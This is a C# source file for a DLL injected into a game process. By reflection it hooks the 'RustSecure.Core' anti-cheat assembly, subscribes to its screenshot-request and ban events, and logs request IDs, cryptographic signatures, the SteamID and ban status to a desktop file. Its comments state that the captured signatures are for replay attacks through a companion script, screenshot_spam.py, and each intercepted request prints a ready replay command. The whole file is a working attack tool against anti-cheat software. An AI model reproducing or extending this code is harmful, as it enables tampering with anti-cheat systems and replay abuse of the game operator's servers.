// CommandInterceptor.cs — Intercepts WebSocket server commands inside RustSecure.Core
// Logs RequestScreenshotV2 signatures for replay attacks.
//
// Compile: mcs -target:library -unsafe CommandInterceptor.cs -out:CommandInterceptor.dll
//
// Injection: load this DLL into the game process BEFORE or alongside Core DLL.
// It hooks AppDomain.AssemblyLoad to catch Core loading, then patches
// HandleServerCommand to log all incoming commands.
//
// Captured signatures can be replayed with screenshot_spam.py:
//   python3 screenshot_spam.py <steamid> --replay rs_captured.log

using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

public static class CommandInterceptor
{
    static readonly string LOG_PATH = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
        "rs_captured.log");

    static bool _installed = false;
    static object _reporterInstance = null;
    static Type _reporterType = null;

    // Entry point — call from injector or native bridge
    [DllExport("Install", CallingConvention = CallingConvention.StdCall)]
    public static void Install()
    {
        if (_installed) return;
        _installed = true;

        Log("CommandInterceptor installed");
        AppDomain.CurrentDomain.AssemblyLoad += OnAssemblyLoad;

        // Check already-loaded assemblies
        foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
        {
            if (asm.GetName().Name == "RustSecure.Core")
            {
                Log("Core already loaded, hooking...");
                HookCore(asm);
                break;
            }
        }

        // Start a background thread that periodically scans for the reporter instance
        new Thread(ScanForReporter) { IsBackground = true, Name = "RS_Interceptor" }.Start();
    }

    static void OnAssemblyLoad(object sender, AssemblyLoadEventArgs args)
    {
        if (args.LoadedAssembly.GetName().Name == "RustSecure.Core")
        {
            Log("Core assembly loaded, hooking...");
            HookCore(args.LoadedAssembly);
        }
    }

    static void HookCore(Assembly core)
    {
        try
        {
            // Strategy 1: Find the WebSocket client type and hook CommandReceived event
            // The client type (StabilizeFrameTiming) receives raw commands from server
            foreach (var type in core.GetTypes())
            {
                try
                {
                    // Look for the type with both ConnectAsync and CommandReceived
                    var methods = type.GetMethods(BindingFlags.Public | BindingFlags.NonPublic |
                                                   BindingFlags.Instance | BindingFlags.Static);
                    bool hasReportThreat = methods.Any(m => m.Name == "ReportThreatAsync");
                    bool hasInitAsync = methods.Any(m => m.Name == "InitializeAsync");

                    if (hasReportThreat && hasInitAsync)
                    {
                        _reporterType = type;
                        Log("Found reporter type: " + type.FullName);

                        // Find HandleServerCommand
                        var handleCmd = type.GetMethod("HandleServerCommand",
                            BindingFlags.NonPublic | BindingFlags.Instance);
                        if (handleCmd != null)
                            Log("Found HandleServerCommand: " + handleCmd);

                        // Find TryHandleControlCommand
                        var tryHandle = type.GetMethod("TryHandleControlCommand",
                            BindingFlags.NonPublic | BindingFlags.Instance);
                        if (tryHandle != null)
                            Log("Found TryHandleControlCommand: " + tryHandle);

                        break;
                    }
                }
                catch { }
            }

            // Strategy 2: Hook the lower-level WebSocket receive
            // Find the WS client type with a _commandCallback or event
            foreach (var type in core.GetTypes())
            {
                try
                {
                    var fields = type.GetFields(BindingFlags.NonPublic | BindingFlags.Instance);
                    var events = type.GetEvents(BindingFlags.Public | BindingFlags.NonPublic |
                                                 BindingFlags.Instance);

                    // StabilizeFrameTiming has _serverUrl, ConnectAsync, etc.
                    bool hasConnect = type.GetMethods(BindingFlags.Public | BindingFlags.Instance)
                        .Any(m => m.Name == "ConnectAsync" || m.Name == "EnsureConnectedAsync");
                    bool hasSend = type.GetMethods(BindingFlags.Public | BindingFlags.Instance)
                        .Any(m => m.Name == "SendAsync");

                    if (hasConnect && hasSend)
                    {
                        Log("Found WS client type: " + type.FullName);

                        // Try to find and hook the command callback
                        foreach (var evt in events)
                            Log("  Event: " + evt.Name);
                        foreach (var fld in fields)
                        {
                            if (fld.FieldType.Name.Contains("Action") ||
                                fld.FieldType.Name.Contains("Func") ||
                                fld.FieldType.Name.Contains("Event"))
                                Log("  Callback field: " + fld.Name + " : " + fld.FieldType);
                        }
                        break;
                    }
                }
                catch { }
            }
        }
        catch (Exception ex)
        {
            Log("HookCore error: " + ex.Message);
        }
    }

    /// <summary>
    /// Background thread that periodically scans for the reporter instance
    /// and attempts to intercept commands via reflection.
    /// </summary>
    static void ScanForReporter()
    {
        Thread.Sleep(10000); // Wait for Core to initialize

        while (true)
        {
            try
            {
                if (_reporterType == null)
                {
                    Thread.Sleep(5000);
                    continue;
                }

                // Scan all static fields in all types for an instance of the reporter
                foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
                {
                    if (asm.GetName().Name != "RustSecure.Core") continue;

                    foreach (var type in asm.GetTypes())
                    {
                        try
                        {
                            var fields = type.GetFields(BindingFlags.Static | BindingFlags.NonPublic |
                                                         BindingFlags.Public);
                            foreach (var fld in fields)
                            {
                                try
                                {
                                    var val = fld.GetValue(null);
                                    if (val != null && _reporterType.IsInstanceOfType(val))
                                    {
                                        if (_reporterInstance != val)
                                        {
                                            _reporterInstance = val;
                                            Log("Found reporter instance in " + type.Name + "." + fld.Name);
                                            StartCommandMonitor();
                                        }
                                    }
                                }
                                catch { }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            Thread.Sleep(5000);
        }
    }

    /// <summary>
    /// Once we have the reporter instance, monitor its internal state
    /// for screenshot request data.
    /// </summary>
    static void StartCommandMonitor()
    {
        if (_reporterInstance == null) return;

        Log("Starting command monitor on reporter instance");

        // Read the _banReceived field periodically to detect bans
        var banField = _reporterType.GetField("_banReceived",
            BindingFlags.NonPublic | BindingFlags.Instance);
        if (banField != null)
        {
            bool banned = (bool)banField.GetValue(_reporterInstance);
            Log("Current ban status: " + banned);
        }

        // Read _steamId
        var steamField = _reporterType.GetField("_steamId",
            BindingFlags.NonPublic | BindingFlags.Instance);
        if (steamField != null)
        {
            var steamId = (string)steamField.GetValue(_reporterInstance);
            Log("SteamID: " + (steamId ?? "null"));
        }

        // Try to subscribe to events
        try
        {
            var screenshotEvent = _reporterType.GetEvent("ScreenshotRequested",
                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
            if (screenshotEvent != null)
            {
                // Create delegate matching Action<string, string, string, string>
                // (requestId, reason, signature, preferredMethod)
                var handler = Delegate.CreateDelegate(
                    screenshotEvent.EventHandlerType,
                    typeof(CommandInterceptor),
                    "OnScreenshotRequested");

                screenshotEvent.AddEventHandler(_reporterInstance, handler);
                Log("Hooked ScreenshotRequested event!");
            }

            var banEvent = _reporterType.GetEvent("BanReceived",
                BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);
            if (banEvent != null)
            {
                var handler = Delegate.CreateDelegate(
                    banEvent.EventHandlerType,
                    typeof(CommandInterceptor),
                    "OnBanReceived");
                banEvent.AddEventHandler(_reporterInstance, handler);
                Log("Hooked BanReceived event!");
            }
        }
        catch (Exception ex)
        {
            Log("Event hook failed: " + ex.Message);
        }
    }

    // Event handlers

    public static void OnScreenshotRequested(string requestId, string reason,
                                              string signature, string preferredMethod)
    {
        Log("=== SCREENSHOT REQUEST INTERCEPTED ===");
        Log("  RequestId:  " + requestId);
        Log("  Reason:     " + reason);
        Log("  Signature:  " + signature);
        Log("  Method:     " + preferredMethod);
        Log("  Timestamp:  " + DateTimeOffset.UtcNow.ToUnixTimeSeconds());
        Log("");
        Log("  Replay with:");
        Log("  python3 screenshot_spam.py <steamid> --request-id \"" + requestId +
            "\" --sig \"" + signature + "\"");
        Log("========================================");
    }

    public static void OnBanReceived(string reason)
    {
        Log("!!! BAN RECEIVED: " + reason);
    }

    static void Log(string message)
    {
        try
        {
            var line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}\n";
            File.AppendAllText(LOG_PATH, line);
        }
        catch { }
    }
}
